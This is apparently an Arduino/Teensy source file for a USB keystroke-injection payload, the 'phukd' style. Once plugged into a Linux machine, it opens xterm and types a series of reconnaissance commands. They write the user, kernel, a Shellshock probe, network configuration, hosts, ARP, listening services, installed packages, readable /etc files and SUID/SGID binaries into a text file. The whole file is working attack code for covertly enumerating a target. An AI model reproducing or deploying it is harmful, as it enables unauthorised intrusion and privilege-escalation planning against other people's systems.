#include "exfil.h"
#include "phukd.h"

void payload() {
  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("xterm");
  delay(3000);
  Keyboard.println("echo \"Logged in user: \" $USER > info_gathering.txt");
  delay(3000);
  Keyboard.println("echo >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo -n \"Distribution Kernel Version: \" >> info_gathering.txt");
  delay(2000);
  Keyboard.println("cat /etc/issue | cut -c1-13 >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo -n \"uname results: \" >> info_gathering.txt");
  delay(2000);
  Keyboard.println("uname -a >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo \"Shellsock Bug Vulnerability: \" >> info_gathering.txt");
  delay(2000);
  Keyboard.println("env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\" >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo \"Mounted filesystems: \" >> info_gathering.txt");
  delay(2000);
  Keyboard.println("mount -l >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo \"Network Configuration: \" >> info_gathering.txt");
  delay(2000);
  Keyboard.println("ifconfig -a | grep 'Link\|inet' >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo \"Print Hosts: \" >> info_gathering.txt");
  delay(2000);
  Keyboard.println("cat /etc/hosts >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo \"Print ARP: \" >> info_gathering.txt");
  delay(2000);
  Keyboard.println("arp >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo \"Development tools availability: \" >> info_gathering.txt");
  delay(2000);
  Keyboard.println("which gcc >> info_gathering.txt");
  delay(2000);
  Keyboard.println("which g++ >> info_gathering.txt");
  delay(2000);
  Keyboard.println("which python >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo \"Print TCP/UDP Listening Services: \" >> info_gathering.txt");
  delay(2000);
  Keyboard.println("netstat -tunlpe >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo \"Installed Packages: \" >> info_gathering.txt");
  delay(2000);
  Keyboard.println("dpkg -l >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo >> info_gathering.txt");
  delay(2000);
  Keyboard.println(" echo \"Find Readable Folders in /etc: \" >> info_gathering.txt");
  delay(2000);
  Keyboard.println("find /etc -user $(id -u) -perm -u=r -o -group $(id -g) -perm -g=r -o -perm -o=r -ls 2> /dev/null >> info_gathering.txt");
  delay(2000);
  Keyboard.println("echo >> info_gathering.txt");
  delay(2000);
  Keyboard.println(" echo \"Find SUID and GUID files\" >> info_gathering.txt");
  delay(2000);
  Keyboard.println("find / -type f -perm -u=s -o -type f -perm -g=s -ls  2> /dev/null >> info_gathering.txt");
  delay(2000);
  Keyboard.println("exit");
}